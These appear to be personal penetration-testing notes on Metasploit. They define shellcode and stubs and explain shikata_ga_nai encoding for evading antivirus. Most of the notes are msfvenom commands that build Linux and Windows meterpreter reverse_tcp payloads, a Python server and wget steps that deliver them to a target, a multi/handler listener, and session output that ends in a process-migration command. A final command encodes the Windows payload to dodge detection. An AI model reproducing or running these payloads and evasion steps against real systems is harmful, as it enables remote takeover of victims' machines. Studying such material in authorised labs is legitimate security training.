Console - Network / Pentesting webapps.
Venom - Physical / social engineering.

some lingo:
```shell
shellcode # a lightweight shell code: payload
stub # something to prepare the environmet for payload
```

Encoding:
Used to evade protection such as IDS or antivirus via encoding the payload so that the signature of the program is different.

The most popular encoder is "shikata_ga_nai" which is a polymorphic encoder.
Meaning it changes the signature every time and generating unique code that has never been seen before by anti viruses.

Read up more on shells [[Getting the shell]]

Using msfvenom:

```shell
└─$ msfvenom -l format # show output formats
└─$ msfvenom -l payloads | grep " meterpreter" | awk '{print $1}' # target sys
└─$ msfvenom -l platforms
└─$ msfvenom -l encoders

```

Example for testing:
```shell
msfvenom -p linux/x86/meterpreter/reverse_tcp lhost=10.0.2.7 lport=4444 -f bash > reverse_tcp.sh
```

Example of making a meterpreter shell on windows:

First create a payload:
```shell
msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.1.2 lport=4444 -f exe > meterpreter_reverse.exe

# You can host the payload on python server
python3 -m http.server 8000

# Now on target machine you can use wget to download thy payload.
# Note: wget on windows is dumb as hell
wget http://192.168.1.2:8000/meterpreter_reverse.exe # for linux
wget http://192.168.1.2:8000/meterpreter_reverse.exe -O filename.exe # for win
```

```shell
msfconsole # run this command and wait
use exploit/multi/handler
[*] Using configured payload generic/shell_reverse_tcp
set payload windows/meterpreter/reverse_tcp
set LHOST 192.168.1.2
set LPORT 4444
exploit # listener will be on
# now you can run the payload for meterpreter shell
# output:
[*] Started reverse TCP handler on 192.168.1.2:4444 
[*] Sending stage (176198 bytes) to 192.168.1.4
[*] Meterpreter session 1 opened (192.168.1.2:4444 -> 192.168.1.4:62638) at 2024-10-10 18:08:00 +0200

meterpreter > guid # see if session works
meterpreter > run post/windows/manage/migrate # migrate shell to other process
# and more crazy stuff you can do here
https://www.offsec.com/metasploit-unleashed/meterpreter-basics/

```

```shell
# naurr
msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.1.2 lport=4444 -f exe -e x86/shikata_ga_nai > meterpreter_reverse.exe
```